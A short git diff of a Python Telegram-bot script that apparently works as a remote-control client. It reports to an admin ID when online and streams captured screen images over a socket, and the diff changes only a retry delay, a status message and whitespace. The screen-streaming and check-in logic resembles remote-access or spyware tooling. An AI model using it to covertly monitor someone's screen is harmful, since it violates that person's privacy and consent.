@@ -17,6 +17,7 @@ from telebot.types import KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemo
 from PIL import Image
 
 
+
 """ Variables """
 API_TOKEN = "token"
 ADMIN_ID = id
@@ -313,7 +314,7 @@ class Client:
                                 break
                             except Exception as e:
                                 bot.send_message(ADMIN_ID, "Сonnection error ❌")
-                                time.sleep(10)
+                                time.sleep(3)
 
                         bot.send_message(ADMIN_ID, "Successful connection ✅")
                         while True:
@@ -323,6 +324,7 @@ class Client:
                             img = Image.frombytes('RGB', (1440, 900), image)
                             data = pickle.dumps(np.array(img))
                             clientsocket.sendall(struct.pack("L", len(data)) + data)
+                            
                     except Exception as e:
                         bot.send_message(ADMIN_ID, f"Error:\n{e}")
                 else:
@@ -333,8 +335,9 @@ class Client:
 
 """ Start """
 client = Client()
-bot.send_message(ADMIN_ID, "ON ✅")
- 
+bot.send_message(ADMIN_ID, "ONLINE ✅")
+
+
 @bot.message_handler(commands=["_start"])
 def send_welcome(ms):
     if checkID(ms):
